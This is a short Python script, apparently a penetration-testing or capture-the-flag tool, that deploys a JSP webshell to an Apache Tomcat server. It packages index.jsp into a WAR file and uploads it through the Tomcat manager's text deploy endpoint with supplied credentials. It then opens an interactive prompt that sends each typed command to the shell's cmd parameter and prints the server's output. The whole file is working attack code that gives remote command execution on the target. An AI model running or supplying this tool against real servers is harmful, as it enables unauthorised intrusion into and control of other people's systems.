import requests
import base64
import os
from bs4 import BeautifulSoup
import time
#Beta 7/27/2021

def shell(url):
    url = url + "webshell/index.jsp?cmd="
    while True:
        try:
            requests.packages.urllib3.disable_warnings() 
            p_shell = input("Shell: ")
            urls = url + p_shell
            
            print(urls)
            sr = requests.get(urls,verify=False)
            
            soup = BeautifulSoup(sr.content, 'html5lib') 
            output = soup.find_all('pre') 
            for i in output: 
                x = i.getText() 
                print(x)
                

        except KeyboardInterrupt:
            print("Bye Bye!")
            exit()

def war(url,path,encoded):
    requests.packages.urllib3.disable_warnings() 
    print("Uploading WAR payload!")

    data = open('webshell.war','rb').read() 

    encoded = "Basic " + encoded
    header = {"Authorization": encoded, "Content-Type": "application/octet-stream"} 
    
    urlw = url + path + "text/undeploy?path=/webshell" 
    wr = requests.put(urlw,headers=header,data=data, verify=False)

    urlw = url + path + "text/deploy?path=/webshell" 
    wr = requests.put(urlw,headers=header,data=data, verify=False)

    if wr.status_code == 200:
        print("Payload uploaded!")
        time.sleep(1)
        shell(url)
    else:
        print("Unable to upload file!")
        time.sleep(1)
        main()
    

def encode(url,path,user,password):
    auth = user + ":" + password
    
    encoded = auth.encode("ascii")
    encoded = base64.b64encode(encoded)
    encoded = encoded.decode("ascii")

    war(url,path,encoded)

def payload_w(url,path,user,password):
    print("Building WAR file")
    time.sleep(1) 
    os.system("jar -cvf webshell.war index.jsp") 
    
    encode(url,path,user,password)

def main():
    print("Welcome to WAR tomcat file uploader!")
    time.sleep(1)
    while True:
        try:
            url = input("Enter url: ")

            print("Enter manager path ( E.G /manager/ )")
            path = input("Path: ")

            user = input("Enter username: ")

            password = input("Enter password: ")

            payload_w(url,path,user,password)

        except KeyboardInterrupt:
            print("Bye Bye!")
            exit()

main()
